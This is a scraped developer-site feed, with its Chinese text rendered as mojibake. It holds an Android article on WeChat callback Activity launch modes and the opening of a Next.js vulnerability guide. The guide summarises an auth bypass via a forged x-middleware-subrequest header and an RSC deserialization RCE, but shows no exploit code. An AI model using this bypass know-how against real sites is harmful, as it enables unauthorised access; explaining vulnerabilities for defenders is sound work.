  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:17:44.000Z" title="Wed Dec 10 2025 02:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Android åº”ç”¨å¼€å‘ä¸­ï¼Œé›†æˆå¾®ä¿¡ç™»å½•ã€æ”¯ä»˜æˆ–å°ç¨‹åºè·³è½¬ç­‰åŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦å®šä¹‰ä¸€ä¸ªç‰¹å®šçš„å›è°ƒ Activityï¼Œå³ <code>WXEntryActivity</code>ã€‚æœ€è¿‘ï¼Œè°ƒè¯•å°ç¨‹åºé‡åˆ°äº†ä¸€ä¸ªè®©äººå›°æƒ‘çš„é—®é¢˜ï¼š<strong>ä»å¾®ä¿¡å°ç¨‹åºè¿”å› App æ—¶ï¼ŒAppæ”¶åˆ°äº†ç›¸å…³ä¿¡æ¯ï¼Œä½†æ— æ³•æ­£å¸¸å±•ç¤ºç¦»å¼€çš„é¡µé¢ã€‚</strong></p>
<p>ç»è¿‡ä¸€ç•ªæ’æŸ¥å’Œè°ƒæ•´ï¼Œç»ˆäºæ‰¾åˆ°äº†é—®é¢˜çš„æ ¹æºï¼Œä¹‹å‰ä»£ç ä¸­è¯¯å°† <code>WXEntryActivity</code> çš„ <code>launchMode</code> è®¾ç½®ä¸ºäº† <code>"singleInstance"</code> ï¼Œä¿®æ”¹ä¸º <code>"singleTask"</code> åï¼Œæ¢å¤æ­£å¸¸ã€‚</p>
<p>æœ¬æ–‡å°†åˆ†æè¿™èƒŒåçš„åŸç†ï¼Œè¿›ä¸€æ­¥ç†è§£ Android Activity çš„ <strong>ä»»åŠ¡æ ˆ (Task Stack)</strong> æœºåˆ¶ï¼Œä»¥åŠè¿™ä¸¤ç§ <code>launchMode</code> åœ¨å¾®ä¿¡å›è°ƒåœºæ™¯ä¸­çš„å·¨å¤§å·®å¼‚ã€‚</p>
<hr/>
<h3 data-id="heading-0">ä¸€ã€é—®é¢˜ç°è±¡ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-1">âŒ é‡åˆ°çš„é—®é¢˜ï¼š</h4>
<p>å½“ç”¨æˆ·åœ¨ App å†…å¯åŠ¨å¾®ä¿¡å°ç¨‹åºï¼Œå®Œæˆæ“ä½œåï¼Œç‚¹å‡»å·¦ä¸Šè§’çš„â€œè¿”å› Appâ€æŒ‰é’®ï¼Œæˆ–è€…å¾®ä¿¡å›è°ƒå¯åŠ¨ <code>WXEntryActivity</code> å¤„ç†ç»“æœåï¼ŒApp æ— æ³•æ­£ç¡®è¿”å›åˆ°å¯åŠ¨å°ç¨‹åºçš„å‰ä¸€ä¸ªé¡µé¢ï¼Œè¡¨ç°ä¸ºç•Œé¢åœæ»æˆ–å›åˆ°äº†ä¸€ä¸ªä¸æ­£ç¡®çš„çŠ¶æ€ã€‚</p>
<h4 data-id="heading-2">âœ… è§£å†³æ–¹æ¡ˆï¼š</h4>
<p>å°†é¡¹ç›® <code>AndroidManifest.xml</code> ä¸­ <code>WXEntryActivity</code> çš„ <code>android:launchMode</code> é…ç½®ä» <code>"singleInstance"</code> ä¿®æ”¹ä¸º <code>"singleTask"</code>ã€‚</p>
<p>XML</p>
<pre><code class="hljs language-ini" lang="ini">&lt;activity
    android:<span class="hljs-attr">name</span>=<span class="hljs-string">"com.xxx.wxapi.WXEntryActivity"</span>
    android:<span class="hljs-attr">launchMode</span>=<span class="hljs-string">"singleTask"</span>
    android:<span class="hljs-attr">exported</span>=<span class="hljs-string">"true"</span>
    ...
/&gt;
</code></pre>
<hr/>
<h3 data-id="heading-3">äºŒã€<code>singleInstance</code> ä¸ºä»€ä¹ˆä¼šå¯¼è‡´â€œè¿”å›å¤±è´¥â€ï¼Ÿ</h3>
<p>ç†è§£è¿™ä¸ªé—®é¢˜ï¼Œå…³é”®åœ¨äºç†è§£ <code>singleInstance</code> å¯¹ Activity ä»»åŠ¡æ ˆçš„æç«¯è¦æ±‚ã€‚</p>
<h4 data-id="heading-4">1. <code>launchMode="singleInstance"</code> çš„æœºåˆ¶ï¼š</h4>
<p>å½“ Activity è¢«è®¾ç½®ä¸º <code>singleInstance</code> æ—¶ï¼Œç³»ç»Ÿä¼šå¼ºåˆ¶æ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªè§„åˆ™ï¼š</p>
<ul>
<li><strong>ç‹¬ç«‹ä»»åŠ¡æ ˆï¼š</strong> æ— è®ºä½•æ—¶å¯åŠ¨è¿™ä¸ª Activityï¼Œç³»ç»Ÿéƒ½ä¼šä¸ºå®ƒåˆ›å»ºä¸€ä¸ª<strong>å…¨æ–°çš„ã€ç‹¬ç«‹çš„ä»»åŠ¡æ ˆ (Task Stack)</strong> ã€‚</li>
<li><strong>æ ˆä¸­å”¯ä¸€ï¼š</strong> è¿™ä¸ªä»»åŠ¡æ ˆä¸­<strong>åªå…è®¸å­˜åœ¨è¿™ä¸€ä¸ª Activity å®ä¾‹</strong>ã€‚</li>
</ul>
<h4 data-id="heading-5">2. å¾®ä¿¡å›è°ƒä¸­çš„â€œè¿·èˆªâ€ï¼š</h4>
<ol>
<li><strong>å¯åŠ¨ï¼š</strong> App çš„æŸä¸ªé¡µé¢ <code>A</code> å¯åŠ¨äº†å¾®ä¿¡å°ç¨‹åºã€‚</li>
<li><strong>å›è°ƒï¼š</strong> å¾®ä¿¡å°ç¨‹åºå®Œæˆåï¼Œå›è°ƒå¯åŠ¨ <code>WXEntryActivity</code>ã€‚æ­¤æ—¶ï¼Œ<code>WXEntryActivity</code> å› ä¸ºæ˜¯ <code>singleInstance</code>ï¼Œå®ƒè¢«æ”¾ç½®åœ¨äº†ä¸€ä¸ª<strong>å…¨æ–°çš„ã€ç‹¬ç«‹çš„ä»»åŠ¡æ ˆ T2</strong> ä¸­ã€‚</li>
<li><strong>App çŠ¶æ€ï¼š</strong> æ‚¨çš„ App ä¸»ä»»åŠ¡æ ˆ <strong>T1</strong>ï¼ˆåŒ…å« <code>A</code> Activity ç­‰ï¼‰ä»ç„¶å­˜åœ¨äºåå°ã€‚</li>
<li><strong>è¿”å›å¤±è´¥ï¼š</strong> <code>WXEntryActivity</code> (åœ¨ T2 ä¸­) å¤„ç†å®Œæ•°æ®åï¼Œé€šå¸¸ä¼šè°ƒç”¨ <code>finish()</code> ç»“æŸè‡ªå·±ã€‚ç”±äº T2 æ ˆä¸­åªæœ‰å®ƒä¸€ä¸ª Activityï¼ŒT2 ä»»åŠ¡æ ˆä¹Ÿä¼šéšä¹‹é”€æ¯ã€‚ç„¶è€Œï¼Œç³»ç»Ÿåœ¨é”€æ¯ T2 ä¹‹åï¼Œ<strong>å¹¶æ²¡æœ‰æ­£ç¡®åœ°å°† T1 ä»»åŠ¡æ ˆä¸­çš„é¡¶éƒ¨ Activity (å³ A)</strong> é‡æ–°å¸¦åˆ°å‰å°ã€‚è¿™å¯¼è‡´ç”¨æˆ·ä½“æ„Ÿä¸Šå°±æ˜¯â€œæ— æ³•è¿”å›â€ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-6">ä¸‰ã€<code>singleTask</code> å¦‚ä½•å®Œç¾è§£å†³é—®é¢˜ï¼Ÿ</h3>
<p><code>singleTask</code> æ¨¡å¼æ˜¯ä¸“é—¨ä¸ºè¿™ç§â€œä¸­è½¬ç«™â€å’Œâ€œå…¥å£â€ç±» Activity è®¾è®¡çš„æœ€ä½³é€‰æ‹©ã€‚</p>
<h4 data-id="heading-7">1. <code>launchMode="singleTask"</code> çš„æœºåˆ¶ï¼š</h4>
<ul>
<li>
<p><strong>å¯»æ‰¾ä»»åŠ¡æ ˆï¼š</strong> Activity å¯åŠ¨æ—¶ï¼Œç³»ç»Ÿä¼šæœç´¢ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨ä¸è¯¥ Activity <strong><code>taskAffinity</code></strong> åŒ¹é…çš„ä»»åŠ¡æ ˆã€‚</p>
</li>
<li>
<p><strong>é‡å¤åˆ©ç”¨ï¼š</strong> å¦‚æœç›®æ ‡ä»»åŠ¡æ ˆï¼ˆå³æˆ‘ä»¬çš„ <strong>App ä¸»ä»»åŠ¡æ ˆ T1</strong>ï¼‰å­˜åœ¨ï¼š</p>
<ul>
<li><strong>Activity ä¼šè¢«æ”¾ç½®åœ¨ T1 ä¸­ã€‚</strong></li>
<li>å¦‚æœ T1 æ ˆä¸­å·²ç»å­˜åœ¨è¯¥ Activity å®ä¾‹ï¼Œç³»ç»Ÿä¼šæ¸…é™¤ä½äºè¯¥å®ä¾‹ä¹‹ä¸Šçš„æ‰€æœ‰ Activityï¼Œä½¿å®ƒæˆä¸ºæ ˆé¡¶ï¼Œå¹¶è°ƒç”¨å®ƒçš„ <code>onNewIntent()</code> æ–¹æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ ˆä¸­å”¯ä¸€ï¼š</strong> åœ¨ä¸€ä¸ªä»»åŠ¡æ ˆå†…ï¼Œ<code>WXEntryActivity</code> å§‹ç»ˆ<strong>åªæœ‰ä¸€ä¸ªå®ä¾‹</strong>ã€‚</p>
</li>
</ul>
<h4 data-id="heading-8">2. æ­£ç¡®çš„å›è°ƒä¸è¿”å›æµç¨‹ï¼š</h4>
<ol>
<li>
<p><strong>å¯åŠ¨ï¼š</strong> App çš„ Activity <code>A</code> å¯åŠ¨å¾®ä¿¡å°ç¨‹åºã€‚</p>
</li>
<li>
<p><strong>å›è°ƒï¼š</strong> å¾®ä¿¡å°ç¨‹åºå›è°ƒå¯åŠ¨ <code>WXEntryActivity</code>ã€‚ç”±äºæ˜¯ <code>singleTask</code>ï¼Œç³»ç»Ÿä¼šæŠŠ <code>WXEntryActivity</code> <strong>ç›´æ¥æ”¾ç½®åœ¨ App çš„ä¸»ä»»åŠ¡æ ˆ T1 çš„æ ˆé¡¶</strong>ï¼Œä½äº <code>A</code> çš„ä¸Šæ–¹ã€‚</p>
<ul>
<li><strong>ä»»åŠ¡æ ˆ T1 çŠ¶æ€ï¼š</strong> <code>... -&gt; Activity B -&gt; Activity A -&gt; WXEntryActivity (æ ˆé¡¶)</code></li>
</ul>
</li>
<li>
<p><strong>æ­£å¸¸è¿”å›ï¼š</strong> <code>WXEntryActivity</code> (åœ¨ T1 ä¸­) å¤„ç†å®Œæ•°æ®åï¼Œè°ƒç”¨ <code>finish()</code> ç»“æŸè‡ªå·±ã€‚</p>
</li>
<li>
<p><strong>å®Œç¾è¡”æ¥ï¼š</strong> <code>WXEntryActivity</code> å‡ºæ ˆåï¼Œ<code>Activity A</code> è‡ªç„¶è€Œç„¶åœ°æˆä¸º T1 çš„æ ˆé¡¶ï¼Œç³»ç»Ÿä¼šå°†å…¶å¸¦åˆ°å‰å°ï¼Œ<strong>å®Œç¾åœ°å›åˆ°äº†å¯åŠ¨å°ç¨‹åºçš„å‰ä¸€ä¸ªé¡µé¢</strong>ï¼Œç¬¦åˆç”¨æˆ·é¢„æœŸã€‚</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">æ€»ç»“ä¸æœ€ä½³å®è·µ</h3>
<p>å¯¹äºå¾®ä¿¡å›è°ƒæ¥å£ <code>WXEntryActivity</code> è€Œè¨€ï¼Œå®ƒçš„æ ¸å¿ƒèŒè´£æ˜¯ï¼š<strong>æ¥æ”¶å›è°ƒç»“æœï¼Œå¤„ç†æ•°æ®ï¼Œç„¶åè¿…é€Ÿé€€å‡ºï¼Œå°†æ§åˆ¶æƒäº¤è¿˜ç»™ App çš„ä¸»ä¸šåŠ¡é¡µé¢ã€‚</strong></p>























<table><thead><tr><th><strong>launchMode</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th><th><strong>å¾®ä¿¡å›è°ƒåœºæ™¯</strong></th><th><strong>ç»“æœ</strong></th></tr></thead><tbody><tr><td><strong><code>singleInstance</code></strong></td><td>éœ€è¦å®Œå…¨ç‹¬ç«‹ã€éš”ç¦»çš„â€œå•ä¸€çª—å£â€åº”ç”¨ï¼Œå¦‚é—¹é’Ÿã€æ¥ç”µæ˜¾ç¤ºç­‰ã€‚</td><td><strong>âŒ ä¸é€‚ç”¨</strong>ï¼Œåˆ›å»ºç‹¬ç«‹ä»»åŠ¡æ ˆï¼Œè¿”å›æ—¶æ— æ³•æ­£ç¡®æ¿€æ´»ä¸» App æ ˆã€‚</td><td><strong>è¿”å›å¤±è´¥/å¡é¡¿</strong></td></tr><tr><td><strong><code>singleTask</code></strong></td><td>ä¸šåŠ¡æµç¨‹ä¸­çš„â€œä¸­è½¬ç«™â€æˆ–â€œä¸»å…¥å£â€ï¼Œç¡®ä¿å…¶åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œä¸”ä½äºä¸»ä»»åŠ¡æ ˆã€‚</td><td><strong>âœ… æœ€ä½³å®è·µ</strong>ï¼Œç¡®ä¿ Activity ä½äºä¸»ä»»åŠ¡æ ˆé¡¶éƒ¨ï¼Œ<code>finish()</code> åå®Œç¾è¿”å›ã€‚</td><td><strong>è¿”å›æ­£å¸¸</strong></td></tr></tbody></table>
<p><strong>å»ºè®®ï¼š</strong> åœ¨é›†æˆä»»ä½•éœ€è¦å›è°ƒçš„ç¬¬ä¸‰æ–¹ SDK (å¦‚å¾®ä¿¡ã€æ”¯ä»˜å®) æ—¶ï¼Œå…¶å›è°ƒ Activity çš„ <code>launchMode</code> å‡ ä¹éƒ½åº”è¯¥é€‰æ‹© <strong><code>singleTask</code></strong>ï¼Œä»¥ç¡®ä¿å…¶æ­£ç¡®é›†æˆåˆ° App çš„ä¸»ä»»åŠ¡æµç¨‹ä¸­ï¼Œé¿å…å‡ºç°ä»»åŠ¡æ ˆæ··ä¹±å¯¼è‡´çš„å¯¼èˆªé—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰]]></title>    <link>https://juejin.cn/post/7581702285564379186</link>    <guid>https://juejin.cn/post/7581702285564379186</guid>    <pubDate>2025-12-10T02:20:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564379186" data-draft-id="7581702285564362802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Next.js"/> <meta itemprop="datePublished" content="2025-12-10T02:20:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é²«å°é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/1046390798032110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390798032110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é²«å°é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:20:08.000Z" title="Wed Dec 10 2025 02:20:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰</h2>
<h3 data-id="heading-1">ä¸€ã€æ¼æ´æ ¸å¿ƒä¿¡æ¯é€Ÿè§ˆï¼ˆå‰ç«¯å¿…çŸ¥ï¼‰</h3>
<h4 data-id="heading-2">1. äº‹ä»¶èƒŒæ™¯ï¼ˆæ—¶é—´ + èµ·å› ï¼‰</h4>
<ul>
<li>
<p><strong>CVE-2025-29927ï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</strong>ï¼š2025 å¹´ 3 æœˆå…¬å¼€ï¼Œå®é™…éšè— 4 å¹´ï¼å½±å“ Next.js 11.1.4 ~ 15.2.2 ç‰ˆæœ¬ï¼Œèµ·å› æ˜¯ä¸­é—´ä»¶å¯¹ <code>x-middleware-subrequest</code> è¯·æ±‚å¤´æ ¡éªŒå¤ªå®½æ¾ï¼Œå¤–éƒ¨å¯ä¼ªé€ ã€‚</p>
</li>
<li>
<p><strong>CVE-2025-66478ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œ RCEï¼‰</strong>ï¼š2025 å¹´ 12 æœˆ 4 æ—¥æŠ«éœ²ï¼ŒCVSS 10.0ï¼ˆæœ€é«˜å±ï¼‰ï¼Œå½±å“ Next.js 15/16 åŠéƒ¨åˆ† 14.x æµ‹è¯•ç‰ˆï¼Œæºäº React Server Componentsï¼ˆRSCï¼‰åè®®çš„ååºåˆ—åŒ–æ¼æ´ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œæ¶æ„è¯·æ±‚é‡Œçš„å‘½ä»¤ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">2. æ¼æ´åŸç†ï¼ˆé€šä¿—è§£é‡Šï¼‰</h4>
<ul>
<li>
<p>ç»•è¿‡æ¼æ´ï¼šNext.js ä¸­é—´ä»¶æŠŠ <code>x-middleware-subrequest</code> å½“ä½œ â€œå†…éƒ¨è¯·æ±‚æ ‡è¯†â€ï¼Œä½†æ²¡éªŒè¯æ˜¯å¦çœŸçš„æ˜¯å†…éƒ¨å‘çš„ï¼Œæ”»å‡»è€…æ‹¼å‡ ä¸ªåˆæ³•å€¼å°±èƒ½éª—ä¸­é—´ä»¶æ”¾è¡Œã€‚</p>
</li>
<li>
<p>RCE æ¼æ´ï¼šApp Router ç”¨ RSC åè®®ä¼ è¾“ç»„ä»¶æ•°æ®ï¼ŒæœåŠ¡å™¨æ¥æ”¶æ•°æ®æ—¶æ²¡æ ¡éªŒï¼Œç›´æ¥æ‰§è¡Œé‡Œé¢çš„å‘½ä»¤ï¼Œç›¸å½“äºç»™æ”»å‡»è€…å¼€äº† â€œæœåŠ¡å™¨æ“ä½œæƒé™â€ã€‚</p>
</li>
</ul>
